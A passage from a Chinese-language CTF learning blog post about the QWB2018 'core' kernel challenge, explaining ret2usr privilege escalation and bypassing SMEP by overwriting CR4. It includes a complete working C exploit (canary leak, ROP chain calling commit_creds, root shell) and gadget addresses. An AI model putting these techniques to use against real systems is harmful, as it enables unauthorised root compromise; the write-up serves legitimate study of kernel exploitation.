<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid /bin/cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 0  -f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>从init文件中我们可以看出<code>/proc/kallsyms</code>中存的符号信息被备份到了<code>/tmp/kallsyms</code>。这样一来<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>使普通用户无法查看确切的内核符号加载地址的措施就形同虚设了。那么之后我们写exp时就能够直接打开<code>/tmp/kallsyms</code>文件进行读取操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250228231014411.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117010705905.png"
                      class=""
                >
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了<strong>/proc/core</strong>，<strong>exit_core</strong>删除了<strong>/proc/core</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144829081.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144951857.png"
                      class=""
                >
<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145051360.png"
                      class=""
                >
<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64
个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量
<code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code>
来 将canary
和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145312844.png"
                      class=""
                >
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code>
中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是
<code>unsigned __int16</code>，但传递的长度是
<code>signed __int64</code>，因此如果控制传入的长度为
<code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145441269.png"
                      class=""
                >
<p><strong>core_write()</strong> 向全局变量 <code>name</code>
上写，这样通过 <code>core_write()</code> 和
<code>core_copy_func()</code> 就可以控制 ropchain 了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145616435.png"
                      class=""
                >
<p>那我们可以首先靠读取<code>/tmp/kallsyms</code>来获取内核符号基址，然后可以直接劫持控制流到用户空间，用户空间则是提前布置调用内核函数的<code>commit_creds(prepare_kernel_cred(null))</code>，然后最后返回用户态执行system("/bin/sh")。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc ret2usr.c -static -masm=intel -g -o ret2usr</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301112049755.png"
                      class=""
                >
<p>这个exp是参照了ctfwiki上的exp，这时我有个疑问就是为什么即使可以直接执行用户空间的代码，最后还需要<code>swapgs; popfq; ret;</code>以及<code>iretq; ret</code>着陆用户态呢，如果直接返回到system("/bin/sh")又会发生什么呢？</p>
<p>这里我们把rop缩短至如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301143500459.png"
                      class=""
                >
<p>然后到我们主程序的spawn_shell中就内核就panic了，第一个call这里也就是getuid这个libc函数的调用。这里即使我们去除掉getuid的判断，system函数调用还是会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301144122307.png"
                      class=""
                >
<p>如果<strong>控制了内核态的 RIP</strong>，并且直接让 <code>RIP</code>
指向 <code>system("/bin/sh")</code> 这样的 libc
函数，会发生以下情况：</p>
<ol type="1">
<li><strong>system() 仍然在内核态运行</strong>
<ul>
<li><code>system("/bin/sh")</code> 这个函数是用户态的 libc
代码，执行时它会认为自己仍然在 Ring 3（但实际上是 Ring 0）。</li>
<li><strong>因为没有切换回用户态，进程仍然在 Ring 0 执行</strong>，但
libc 代码假设它在用户态，可能会导致非法访问内核地址，或者崩溃。</li>
</ul></li>
<li><strong>可能访问非法地址</strong>
<ul>
<li><code>system()</code> 需要用户态的栈，如果它访问用户态的
<code>RSP</code>，但 <code>RSP</code>
仍然是内核态栈，可能会导致崩溃。</li>
</ul></li>
<li><strong>可能执行 <code>syscall</code>，导致未知行为</strong>
<ul>
<li><code>system()</code> 依赖 <code>execve()</code>，会执行
<code>syscall</code>，但 <strong>在内核态执行 <code>syscall</code>
会导致崩溃</strong>，因为 <code>syscall</code> 只能从用户态触发。</li>
</ul></li>
</ol>
<p>所以我们完成提权后还需着陆用户态。</p>
<h4 id="smep保护绕过">smep保护绕过</h4>
<p>首先我们要了解smep保护开启与否与CR4寄存器的值密切相关。当 CR4
寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301145351542.png"
                      class=""
                >
<p>但是如果我们开启了smep保护，上述exp就不能成功运行了。首先要开启smep，就可以简单的在启动文件里面的<code>-cpu</code>选项中加上一个<code>+smep</code>即可。而且如果想在cpu选项开启smep或smap保护，都需要先明确指定cpu模型。</p>
<p>如上题的start.sh更改如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu qemu64-v1,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>那么我们如果再次进入内核环境并调用我们的ret2usr的exp，内核就会直接panic，主要是因为开启了smep保护。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301113143244.png"
                      class=""
                >
<p>那么我们就可以开始找能够更改cr4寄存器值的gadget，首先肯定是检索cr4，我们关注中间的几个gadget。其中有的<code>push rcx; popfq;</code>这种实际上不用管，相当于把rcx寄存器的值存到e/rflags寄存器中。那么我们可以通过控制rax或rdi来控制cr4。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150149544.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150749543.png"
                      class=""
                >
<p>比如我找了<code>pop rdi;ret</code>的gadget，然后就能完全控制cr4寄存器的值了。为了关闭
smep 保护，常用一个固定值 <code>0x6f0</code>，即
<code>mov cr4, 0x6f0</code>。从 <code>0x6f0</code> 可以看出它
<strong>启用了以下 CR4 位</strong>：</p>
<table>
<thead>
<tr>
<th>Bit</th>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>7</td>
<td>PGE</td>
<td>启用全局页，提高 TLB 命中率</td>
</tr>
<tr>
<td>9</td>
<td>OSFXSR</td>
<td>启用 <code>FXSAVE/FXRSTOR</code> 指令</td>
</tr>
<tr>
<td>10</td>
<td>OSXMMEXCPT</td>
<td>允许 SSE 异常处理</td>
</tr>
<tr>
<td>5</td>
<td>PAE</td>
<td>启用物理地址扩展</td>
</tr>
<tr>
<td>4</td>
<td>PSE</td>
<td>启用 4MB 大页</td>
</tr>
<tr>
<td>6</td>
<td>MCE</td>
<td>启用机器检查异常</td>
</tr>
</tbody>
</table>
<p>这些是正常的系统默认启用的 CPU 特性，并不会影响漏洞利用。</p>
<p>rop更改如下，然后就能正常直接走ret2usr：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 10; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    rop[i] = canary;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)getPrivilege;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">rop[i++] = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)spawn_shell;       // rip </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = user_cs;</span></span><br><span class="line"><span class="comment">rop[i++] = user_rflags;</span></span><br><span class="line"><span class="comment">rop[i++] = user_sp;</span></span><br><span class="line"><span class="comment">rop[i++] = user_ss;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;     <span class="comment">//pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81075014</span> + offset;      <span class="comment">// mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>改前后的cr4寄存器值如下，确实能够成功修改。然后我们回去把init改成用普通用户启动，测试是否能够提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
